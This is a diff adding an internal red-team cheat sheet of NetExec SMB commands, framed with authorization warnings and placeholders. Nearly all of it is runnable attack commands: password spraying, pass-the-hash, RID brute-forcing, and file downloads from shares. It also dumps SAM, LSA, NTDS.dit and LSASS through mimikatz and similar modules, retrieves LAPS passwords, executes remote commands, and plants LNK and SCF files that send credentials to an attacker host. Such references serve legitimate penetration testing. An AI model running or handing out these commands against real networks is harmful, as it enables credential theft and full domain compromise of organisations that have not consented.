@@ -1,0 +1,150 @@
+Title: NetExec / SMB Enumeration Cheat Sheet (Command examples included, placeholders used)
+Source: User Notes (sanitized)
+Classification: Internal red-team reference — FOR AUTHORIZED USE ONLY
+Last updated: 2025-09-26
+
+!!! AUTHORIZATION NOTICE !!!
+This document contains command examples for penetration testing tools. Use ONLY within authorized engagements or lab environments. Do not run these commands against systems for which you do not have explicit permission. Document all activity, protect outputs, and follow your organization's legal & ethics policies.
+
+=== OVERVIEW ===
+Purpose: Reference of NetExec SMB commands organized by task (enumeration, shares, sessions, dumps, execution, vulnerability checks).
+Placeholders:
+  - $TARGET / $TARGETS : single target or target list
+  - $DC                : domain controller host or IP
+  - $USERNAME / $PASS  : credentials
+  - $NTHASH / $LMNT    : credential hashes
+  - $ATTACKER_IP       : your listener / receiver IP
+Always replace placeholders with authorized test values in your lab.
+
+=== ENUMERATION (Network / Basic) ===
+# Basic NetExec SMB enumeration (check connectivity / quick test)
+netexec smb $TARGETS
+
+# Enumerate shares (list share names & access)
+netexec smb $TARGETS -u $USERNAME -p $PASS --shares
+
+=== SHARES — spider_plus (search shares and get metadata) ===
+# Run spider_plus to enumerate files (metadata JSON per host)
+netexec smb $TARGETS -u $USERNAME -p $PASS -M spider_plus
+
+# Run spider_plus and download files (READ_ONLY=False will copy contents to attacker host) — use only for targeted hosts
+netexec smb $TARGETS -u $USERNAME -p $PASS -M spider_plus -o READ_ONLY=False
+
+# Faster targeted dumps: run spider_plus on selected hosts rather than whole /24 ranges to avoid long runs
+
+=== SESSIONS / DISKS / USERS ===
+# Enumerate active sessions
+netexec $TARGETS -u $USERNAME -p $PASS --sessions
+
+# List disks and mounted volumes
+netexec smb $TARGETS -u $USERNAME -p $PASS --disks
+
+# Logged-on users (interactive sessions)
+netexec smb $TARGETS -u $USERNAME -p $PASS --loggedon-users
+
+# Domain users listing
+netexec smb $TARGETS -u $USERNAME -p $PASS --users
+
+# RID cycling (brute enumeration by RID)
+netexec smb $TARGETS -u $USERNAME -p $PASS --rid-brute
+
+=== GROUPS ===
+# Domain groups enumeration
+netexec smb $TARGETS -u $USERNAME -p $PASS --groups
+
+# Local groups on hosts
+netexec smb $TARGETS -u $USERNAME -p $PASS --local-groups
+
+=== PASSWORD POLICY ===
+# Query domain/local password policy
+netexec smb $DC -u $USERNAME -p $PASS --pass-pol
+
+=== CREDENTIAL CHECKS & AUTH ===
+# Check username + password
+netexec smb $TARGETS -u $USERNAME -p $PASS
+
+# Check username + hash (NTLM)
+netexec smb $TARGETS -u $USERNAME -H 'LM:NT'
+# or
+netexec smb $TARGETS -u $USERNAME -H 'NTHASH'
+
+# Null (anonymous) session attempt
+netexec smb $TARGETS -u '' -p ''
+
+=== PASSWORD SPRAY EXAMPLES (use rate limiting) ===
+# Spray a single password across multiple usernames
+netexec smb $TARGET -u $USERNAME user2 user3 -p Summer18
+
+# Try multiple passwords for a single user
+netexec smb $TARGET -u $USERNAME -p $PASS1 $PASS2 $PASS3
+
+# Use a file of usernames
+netexec smb $TARGET -u /path/to/users.txt -p Summer18
+
+# Use a file of passwords
+netexec smb $TARGET -u $USERNAME -p /path/to/passes.txt
+
+# Continue spraying after a success (use with caution)
+netexec smb $TARGET -u /path/to/users.txt -p Summer18 --continue-on-success
+
+=== LOCAL AUTHENTICATION MODE ===
+# Force local authentication context (test local accounts)
+netexec smb $TARGETS -u $USERNAME -p $PASS --local-auth
+
+=== CREDENTIAL DUMP (high-level commands / modules) ===
+# Dump SAM (local account hashes)
+netexec smb $TARGETS -u $USERNAME -p $PASS --sam
+
+# Dump LSA secrets
+netexec smb $TARGETS -u $USERNAME -p $PASS --lsa
+
+# Extract NTDS.dit via RPC on domain controller (sensitive)
+netexec smb $DC -u $USERNAME -p $PASS --ntds
+# Or using VSS snapshot method
+netexec smb $DC -u $USERNAME -p $PASS --ntds vss
+
+# LSASS extraction modules (memory/process techniques) — very high impact
+netexec smb $TARGET -u $USERNAME -p $PASS -M lsassy
+netexec smb $TARGET -u $USERNAME -p $PASS -M nanodump
+netexec smb $TARGET -u $USERNAME -p $PASS -M mimikatz
+netexec smb $TARGET -u $USERNAME -p $PASS -M procdump
+
+# LAPS retrieval (via LDAP module)
+netexec ldap $DC -u $USERNAME -p $PASS -M laps -o computer=$TARGET
+
+=== REMOTE COMMAND EXECUTION (conceptual examples) ===
+# Execute a single CMD command (e.g., whoami)
+netexec $TARGET -u Administrator -p $PASS -x whoami
+
+# Execute a PowerShell command (note detection risk)
+netexec $TARGET -u Administrator -p $PASS -X '$PSVersionTable'
+
+=== WRITE / LEAK FILES (high level examples) ===
+# Create LNK artifact or similar (use only in authorized tests and plan cleanup)
+# Example conceptual usage (module slinky)
+netexec smb $TARGETS -u $USERNAME -p $PASS -M slinky -o SERVER=$ATTACKER_IP -o NAME=<file_name>
+
+# Example SCF-style artifact (conceptual)
+netexec smb $TARGETS -u $USERNAME -p $PASS -M scuffy -o SERVER=$ATTACKER_IP -o NAME=<file_name>
+
+=== CVE / VULNERABILITY CHECK MODULES (high-level) ===
+# ZeroLogon indicator check (non-exploit)
+netexec smb $DC -u '' -p '' -M zerologon
+
+# PetitPotam sequence check (non-exploit)
+netexec smb $DC -u '' -p '' -M petitpotam
+
+# noPAC checks / detection indicators
+netexec smb $DC -u $USERNAME -p $PASS -M nopac
+
+=== NOTES, WARNINGS & BEST PRACTICES ===
+- Always verify scope and authorization before running any data extraction or privileged modules.
+- Prefer metadata-only enumerations for wide scans; restrict content downloads to targeted hosts.
+- Keep thorough logs: module, flags, target list, start/end time, and justification.
+- Secure and encrypt any downloaded artifacts; follow the cleanup plan after the engagement.
+- Consider detection trade-offs and the potential impact on availability when selecting modules (LSASS dumps, NTDS extraction are high-impact).
+- When adding this file to a retrieval index, protect the index with appropriate access control and do not expose it externally.
+
+=== MAINTAINER / VERSION ===
+Maintainer: [Your Name / Team]
+Sanitized: 2025-09-26
